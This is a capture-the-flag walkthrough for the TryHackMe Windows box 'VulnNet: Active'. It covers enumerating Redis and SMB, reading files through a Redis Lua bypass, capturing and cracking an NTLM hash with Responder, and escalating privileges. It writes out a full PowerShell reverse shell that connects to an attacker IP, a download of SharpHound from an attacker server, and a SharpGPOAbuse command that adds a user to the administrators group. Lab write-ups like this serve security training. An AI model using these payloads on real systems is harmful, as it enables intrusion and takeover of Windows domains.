
# VulnNet: Active

![[attachments/Pasted image 20240527125137.png]]


VulnNet Entertainment had a bad time with their previous network which suffered multiple breaches. Now they moved their entire infrastructure and hired you again as a core penetration tester. Your objective is to get full access to the system and compromise the domain.  

- **Difficulty**: Medium
- **Operating System**: Windows
- **Platform**: Tryhackme
- **Category**:

Another Windows machine. Do your best and breach it, good luck!

Note: Since this is a windows machine you _might_ need to give it up to 5 minutes to boot.

Icon made by [Freepik](https://www.freepik.com) from [www.flaticon.com](http://www.flaticon.com)

# Nmap Scan

```shell
# Nmap 7.94SVN scan initiated Mon May 27 09:34:14 2024 as: nmap -sCV -p- --min-rate=1000 -T4 -oN scan -vv 10.10.168.159
Nmap scan report for 10.10.168.159
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2024-05-27 09:34:14 WAT for 232s
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
6379/tcp  open  redis         syn-ack ttl 127 Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-27T08:37:30
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52912/tcp): CLEAN (Timeout)
|   Check 2 (port 33912/tcp): CLEAN (Timeout)
|   Check 3 (port 12477/udp): CLEAN (Timeout)
|   Check 4 (port 44912/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 0s

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 27 09:38:06 2024 -- 1 IP address (1 host up) scanned in 231.90 seconds
```

Syntax

```shell
nmap -sCV -p- --min-rate=1000 -T4 <IP> -oN scan -vv
```

Notable services: SMB, RPC, Redis, DNS

# SMB Enumeration

Using `smbclient`

![[attachments/Pasted image 20240527095558.png]]

No shares available via anonymous login. We might have to get valid credentials later to enumerate.

`enum4linux` reveals the domain to be VULNNET

![[attachments/Pasted image 20240527111711.png]]

`crackmapexec` reveals the FQDN to be `vulnnet.local`

![[attachments/Pasted image 20240527111851.png]]

we can add this entry to `/etc/hosts` file

# Redis Enumeration

Using a tool called `redis-cli` we can get more information about the redis service running on the target.

![[attachments/Pasted image 20240527100852.png]]

We can search the version online for any exploit, which should lead to the github [repo](https://github.com/Ridter/redis-rce)

![[attachments/Pasted image 20240527101803.png]]

For this exploit to run you have to compile a redis module but the link specified in the repo is dead. You can visit [this](https://github.com/b1ngz/RedisModules-ExecuteCommand) instead. Clone the repo and run `make` to compile

![[attachments/Pasted image 20240527102245.png]]

After that you should see the module

![[attachments/Pasted image 20240527102333.png]]

Now clone this [repo](https://github.com/Ridter/redis-rce) and run the exploit to gain a shell. Make sure to specify the path to your compiled module

![[attachments/Pasted image 20240527103411.png]]

This exploit kept failing so i had to try [another](https://github.com/n0b0dyCN/redis-rogue-server) which also didn't work. Did a little research and found out the MODULE command doesn't exist on the redis server which is needed to upload the module we compiled

![[attachments/Pasted image 20240527112425.png]]

So i had to take a step back and redo my enumeration. Looking at some redis cheetsheets, i found the command `config get *`

![[attachments/Pasted image 20240527112219.png]]

and i was able to get a username `enterprise-security`

![[attachments/Pasted image 20240527112252.png]]

This will be useful later on.

Going back to hacktricks also, i decided to go for the LUA sandbox bypass. You can find the line here https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis

![[attachments/Pasted image 20240527112618.png]]

Accessing the link, we can see a way to read files from the system via the redis-server

![[attachments/Pasted image 20240527113537.png]]

Although in our own case we have to enclose the dotfile() in double quote for it to work. I got the idea from this post

![[attachments/Pasted image 20240527114223.png]]


![[attachments/Pasted image 20240527113802.png]]

And with that we can get the first flag. Enclose the flag in THM{}.

Next up is to leverage this and get some vital info. Since all the commands are running as the user currently loggen into the redis server (enterprise-security probably), every command we run will be run with the privilege of the user. Since this is a windows environment and there's an smb server present, we can try to access a share and capture the user's hash with responder. This attack is known as LLMNR Poisoning, you can read more about the attack on my blog post [here](https://deusx7.github.io/Posts/Active_Directory/LLMNR_Poisoning/LLMNR_Poisoning.html)

First up is to start responder on your vpn interface (tun0)

![[attachments/Pasted image 20240527120211.png]]

Access the share via the redis server arbitrary file read exploit and capture the hash

![[attachments/Pasted image 20240527120346.png]]

The IP specified should be your attack vpn IP.

Copy and crack the hash with hashcat. The mode is 5600

![[attachments/Pasted image 20240527120523.png]]

![[attachments/Pasted image 20240527120643.png]]

Now we have the password for the user `enterprise-security`

Trying the creds with psexec and evil-winrm doesn't work so we still have work to do

![[attachments/Pasted image 20240527121843.png]]

![[attachments/Pasted image 20240527121908.png]]
# SMB Enumeration (again)

Since we can't login yet, we have to perform more enumeration.
Listing shares with smbmap using the credentials

![[attachments/Pasted image 20240527122018.png]]

This shows we have read and write access to the share `Enterprise-Share`

![[attachments/Pasted image 20240527122427.png]]

We can see there is a powershell script here. Let's download and check the contents

![[attachments/Pasted image 20240527122716.png]]

The script is used for removing all contents of Public user's Documents directory 

![[attachments/Pasted image 20240527123014.png]]

From the nature of the script, it seems like something that runs at scheduled intervals. If that is the case and we have write permissions to this share then we can create a powershell script that has the same name but it'll contain a powershell reverse shell payload. Then we overwrite the original script, setup a netcat listener and wait for our shell hopefully.

The payload i will be using:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.8.129.243',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Put it in a file.
Overwrite the script 

![[attachments/Pasted image 20240527124649.png]]

Wait for a shell

![[attachments/Pasted image 20240527125112.png]]

# Privilege Escalaltion

First thing as always is to check for account privileges with `whoami /all`

![[attachments/Pasted image 20240527125310.png]]

We have `SeImpersonatePrivilege` which can be used to escalate our privilege.

I tried using printspoofer, roguepotato and even godpotato but nothing worked so i decided to perform some enumeration via SharpHound.

Download the SharpHound binary from [here](https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip) . The latest version doesn't work properly

Transfer to the target using python server 

```shell
python -m http.server 80
```

![[attachments/Pasted image 20240527150845.png]]

```powershell
Invoke-WebRequest -Uri http://10.8.129.243/SharpHound.exe -OutFile C:\Users\enterprise-security\Desktop\SharpHound.exe
```

Run the command

```powershell
.\SharpHound.exe --CollectionMethods All --Domain DOMAIN --ExcludeDCs
```

![[attachments/Pasted image 20240527151446.png]]

Check your directory and there will be a zip file there

![[attachments/Pasted image 20240527151519.png]]

Transfer this to the smb share and access it on your machine to download the file

![[attachments/Pasted image 20240527151751.png]]

![[attachments/Pasted image 20240527151852.png]]

Launch neo4j and Bloodhound

```shell
sudo neo4j console
sudo bloodhound
```

Hopefully you already have them setup already, if not then check a guide on how to do so. It very easy and straighforward.

- After that create a folder and name it "Bloodhound" 
- Move the zip file into this folder
- Unzip the file
- Drag and drop the contents and it'll automatically be imported

If that doesn't work the select this icon and go to the location of the file, select all and click open

![[attachments/Pasted image 20240527153814.png]]


Next is to find the shortest path to domain admin

![[attachments/Pasted image 20240527163729.png]]

With this we are able to see that we have GenericWrite permission to the GPO `security-pol-vn`

![[attachments/Pasted image 20240527163959.png]]

We can abuse this to add our user to the administrators group using `SharpGPOAbuse`

```shell
SharpGPOAbuse.exe --AddComputerTask --TaskName "PrivEsc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
```

Download the binary [here](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)

![[attachments/Pasted image 20240527173646.png]]

It's now done, next is to force update because we can't wait.

We can confirm using `net users enterprise-security`

![[attachments/Pasted image 20240527174429.png]]

we are part of administrators local group membership

